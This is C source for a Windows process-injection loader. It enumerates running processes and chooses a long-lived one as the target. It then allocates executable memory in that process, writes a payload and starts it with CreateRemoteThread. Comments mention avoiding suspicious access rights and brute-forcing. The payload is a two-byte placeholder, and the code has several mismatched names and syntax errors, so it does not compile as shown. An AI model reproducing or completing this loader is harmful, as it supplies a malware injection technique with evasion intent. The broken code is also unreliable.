
#include "PI.h"


void	printListInfos(t_list_infos *list) {
	t_pinfo	*head_tmp = list->head;
	while (head_tmp) {
		printf("processId: %d, handleAddress: 0x%p\n", head_tmp->pid, head_tmp->HProcess);
		head_tmp = head_tmp->next;
	}
}

void	printProcessInfos(t_pinfo process) {
	printf("Process id: %d\n Process Handle: 0x%p\n Time64: %lld\n", process.pid, process.Hprocess, process.time64);
}


t_list_infos	*getProcessesList() {
	int ownPid = _getpid();



	size_t lpidProcessSize = 1024;
	DWORD *lpidProcesses = (DWORD*)malloc(sizeof(DWORD) * lpidProcessSize);
	DWORD processesReturned;

	if (!EnumProcesses(lpidProcesses, sizeof(DWORD) * 1024, &processesReturned)) {
		printf("Couldn't fetch processes running on the machine, Error code %lx\n", GetLastError());
		free(lpidProcesses);
		return NULL;
	}

	int jumper = -1;
	int usefullProcesses = 0;
	t_list_infos *listInfos = (t_list_infos*)malloc(sizeof(t_list_infos));
	t_pinfo *processInfo;
	listInfos->head = NULL;
	listInfos->tail = NULL;
	listInfos->choosenProcess;
	while (++jumper < processesReturned / sizeof(DWORD)) {
		// better safe than sorry :)
		if (lpidProcesses[jumper] && lpidProcesses[jumper] != ownPid) {
			HANDLE HProcess;

			if (!(HProcess = OpenProcess(
					PROCESS_CREATE_THREAD|
					PROCESS_VM_WRITE|
					PROCESS_VM_OPERATION|
					PROCESS_QUERY_INFORMATION,
					FALSE,
					lpidProcesses[jumper]
				)))
				continue;
			processInfo = (t_pinfo*)malloc(sizeof(t_pinfo));

			// timings to use a process that was up for a long time, that might be a good condidat for injecting, cause it might stay up for a long moment.
			if(!(GetProcessTimes(
					Hprocess,
					&(processInfo->PCreationTime),
					&(processInfo->PExitTime),
					&(processInfo->PKernelTime),
					&(processInfo->PUserTime)
				))) {
				free(processInfo);
				printf("Couldn't get process %d times, Error: %lx", lpidProcesses[jumper], GetLastError());
				continue;
			}
			processInfo->pid = lpidProcesses[jumper];
			processInfo->HProcess = HProcess;
			processInfo->next = NULL;
			memset(&(processInfo->time64), 0, 8);
			processInfo->time64 = processInfo->PcreationTime->dwHighDateTime;
			processInfo->time64 = processInfo->time64 << 32 | processInfo->PcreationTime->dwLowDateTime;

			if (!listInfos->choosenProcess || listInfos->choosenProcess->time64 > processInfo->time64) {
				listInfos = processInfo;
			}

			if (!listInfos->head && !listInfos->tail) {
				listInfos->head = processInfo;
				listInfos->tail = processInfo;
			}
			listInfos->tail->next = processInfo;
			listInfos->tail = processInfo;

		}
	}

	return listInfos;
}

int		main(int argc, char** argv) {


	t_list_infos *currentProcessesList;
	while (!(currentProcessesList = getProcessesList()));

	printListInfos(currentProcessesList);


	char *payload = "\x69\x69";
	size_t payloadSize = sizeof(payload);


	HANDLE HProcess = NULL;
	int pid = currentProcessesList->choosenProcess->pid;

	printProcessInfos(currentProcessList->choosenProcess);
	printf("Press anything to complete !\n");
	scanf();

	// PROCESS_CREATE_THREAD|PROCESS_VM_WRITE|PROCESS_VM_OPERATION
	// Need to use the above permissions ! ALL_ACCESS is to suspecious.
	// if (!(HProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid))) {
	// 	printf("Couldn't get access to the provided process id, Error code %lx\n", GetLastError());
	// 	return EXIT_FAILURE;
	// }

	currentProcessesList->choosenProcess->VMPointer = NULL;

	if (!(currentProcessesList->choosenProcess->VMPointer = VirtualAllocEx(
			currentProcessesList->choosenProcess->HProcess,
			NULL,
			payloadSize,
			MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
		))) {
		printf("Couldn't reserve/alloc memory in process virtualAddress, Error code %lx\n", GetLastError());
		return EXIT_FAILURE;
	}

	printf("HProcess : 0x%p\nVMPointer : 0x%p\n", currentProcessesList->choosenProcess->HProcess, currentProcessesList->choosenProcess->VMPointer);

	currentProcessesList->choosenProcess->dataWritten = 0;
	currentProcessesList->choosenProcess->wasDelivered = FALSE;

	if (!(currentProcessesList->choosenProcess->wasDelivered = WriteProcessMemory(
			currentProcessesList->choosenProcess->HProcess,
			currentProcessesList->choosenProcess->VMPointer,
			payload,
			payloadSize,
			&(currentProcessesList->choosenProcess->dataWritten)
		))) {
		printf("Couldn't deliver the playload, Error code %lx\n", GetLastError());
		// need to brut-force !
		return EXIT_FAILURE;
	}

	if (currentProcessesList->choosenProcess->dataWritten != payloadSize) {
		printf("Payload wasn't written in its entirety, payloadSize: %ud, dataWritten: %ud\n", payloadSize, currentProcessesList->choosenProcess->dataWritten);
	}
	
	printf("payloadSize: %zu, dataWritten: %zu\n", payloadSize, currentProcessesList->choosenProcess->dataWritten);

	currentProcessesList->choosenProcess->HThread = NULL;

	currentProcessesList->choosenProcess->dwThreadId

	if (!(currentProcessesList->choosenProcess->HThread = CreateRemoteThread(
			currentProcessesList->choosenProcess->HProcess,
			NULL,
			0,
			(LPTHREAD_START_ROUTINE)currentProcessesList->choosenProcess->VMPointer,
			NULL,
			0,
			&(currentProcessesList->choosenProcess->dwThreadId)
		))) {
		printf("Couldn't summon a thread. to execute the payload, %lx\n", GetLastError());
		return EXIT_FAILURE;
	}

	printf("Thread was summoned correctly with id : %ud\n", currentProcessesList->choosenProcess->dwThreadId);

	return EXIT_SUCCESS; 
}